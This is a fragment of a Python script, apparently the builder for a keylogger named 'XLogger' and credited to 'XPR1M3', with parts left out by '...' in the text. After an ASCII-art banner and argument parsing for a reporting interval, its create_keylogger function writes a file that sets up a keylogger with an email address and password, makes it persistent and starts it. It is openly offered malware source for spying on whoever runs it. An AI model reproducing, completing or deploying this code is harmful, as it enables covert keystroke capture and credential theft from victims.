...
print("                                         ")
print("\ \ / / |                                ")
print(" \ V /| |     ___   __ _  __ _  ___ _ __ ")
print("  > < | |    / _ \ / _` |/ _` |/ _ \ '__|")
print(" / . \| |___| (_) | (_| | (_| |  __/ |   ")
print("/_/ \_\______\___/ \__, |\__, |\___|_|   ")
print("                    __/ | __/ |          ") 
print("                   |___/ |___/           ")
print("                                         ")                                                  
print("                                              Coded By XPR1M3 ")
print("                                         ")
def get_arguments():
    parser = argparse.ArgumentParser(description='XLogger v1.0')
    parser._optionals.title = "Optional Arguments"
    parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds.", default=350)
...
def create_keylogger(file_name, interval, email, password):
    with open(file_name, "w+") as file:
        ...
        file.write("xlogger = keylogger.Keylogger(" + interval + ",'" + email + "','" + password + "')\n")
        file.write("xlogger.become_persistent()\n")
        file.write("xlogger.start()\n")
